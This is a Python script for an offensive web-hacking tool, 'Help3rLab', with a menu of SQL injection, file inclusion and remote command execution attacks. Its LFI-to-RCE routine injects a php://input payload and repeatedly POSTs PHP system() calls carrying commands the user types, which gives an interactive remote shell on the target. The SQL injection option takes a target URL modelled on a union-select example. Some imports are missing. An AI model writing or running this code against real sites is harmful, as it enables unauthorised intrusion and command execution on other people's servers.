#!./bin/python3
import json
from modules import Terminal as terminal, Output

terminal().clear()

class Help3rLab:
    def sqli(self):
        try:
            print("\033[94m[\033[93;1m!\033[94m]\033[97;0m Info    : Change the injection point to an asterisk")
            print("\033[94m[\033[93;1m!\033[94m]\033[97;0m Example : https://www.target.com/readnews.php?id=4+and+0+union+select+1,*,3,4,5--+-")
            url = input("\n\033[94m[\033[93;1m?\033[94m]\033[97;0m Your url target : ")
            Terminal = terminal().setup(url)
            Terminal.run()
        except KeyboardInterrupt:
            print("\n\033[94m[\033[93;1m!\033[94m]\033[97;0m CTRL + C detected")
            print("\033[94m[\033[93;1m!\033[94m]\033[97;0m Aborting..\n")
            exit()
        except Exception as e:
            print("\033[94;1m[\033[93;1m!\033[94m]\033[97;0m Could not get a response from the target\n")
            exit()
    
    def menu(self):
        print("""
        \033[97;1m[\033[91;1m+\033[97m] Options :
        \033[97;1m└[\033[92;1m•\033[97m] \033[91m1. \033[97mSQL Injection
        \033[97;1m└[\033[92;1m•\033[97m] \033[91m2. \033[97mRemote File Inclusion
        \033[97;1m└[\033[92;1m•\033[97m] \033[91m3. \033[97mLocal File Inclusion
        \033[97;1m└[\033[92;1m•\033[97m] \033[91m4. \033[97mRemote Command Execution
        \033[97;1m└[\033[92;1m•\033[97m] \033[91m5. \033[97mLFI to RCE
        """)


    def lfitorce(self):
        url = input("[?] Input Url : ")
        injection = input("[?] Injection parameter (ex. ?page=Data) : ")
        pisah = injection.split("=")

        print("\n")
        print("[!] Loading to injection RCE...")
        time.sleep(2)
        
        delete_whitelist = url.replace(injection, "")
        payload = "php://input"
        in_payload = pisah[0] + "=" + payload
        
        print("[!] Requets to target...")
        time.sleep(2)
        
        print("\n")
        
        i = 0
        
        while i < 1:
            injection_command = input("RCE@injection:# ")
            command = "<?php system('"+ injection_command +"'); ?>"
            rce = requests.post(delete_whitelist + in_payload, data=command)
            print(rce.text)
            if injection_command == 'exit':
                i = 1

print(terminal().banner())
Help3rLab().menu()

try:
    action = input("\n\033[94m[\033[93;1m?\033[94m]\033[97;0m Options : ")

    if action == "1":
        Help3rLab().sqli()
    elif action == "5":
        Help3rLab().lfitorce()
except KeyboardInterrupt:
    print('\n[\033[92m+\033[97m] CTRL + C detected')
    print('[\033[92m+\033[97m] Exiting...')
    raise SystemExit
